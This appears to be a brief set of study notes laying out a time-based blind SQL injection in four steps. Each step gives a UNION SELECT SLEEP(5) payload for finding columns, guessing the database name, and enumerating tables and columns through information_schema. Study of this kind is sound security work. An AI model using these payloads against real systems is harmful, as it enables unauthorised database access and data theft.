#time_blind_sql_injection

| Step | Description       | Realisation                                                                                                                          |
| ---- | ----------------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| 1    | Find column count | `admin123' UNION SELECT SLEEP(5);--`                                                                                                 |
| 2    | Get database name | `admin123' UNION SELECT SLEEP(5),"column" where database() like 's%';--`                                                             |
| 3    | Enumerate table   | `admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'database_name' and table_name like 'u%';--`  |
| 3    | Get column names  | `admin123' UNION SELECT SLEEP(5),2 FROM information_schema.columns WHERE table_schema = 'database_name' and table_name like 'u%';--` |

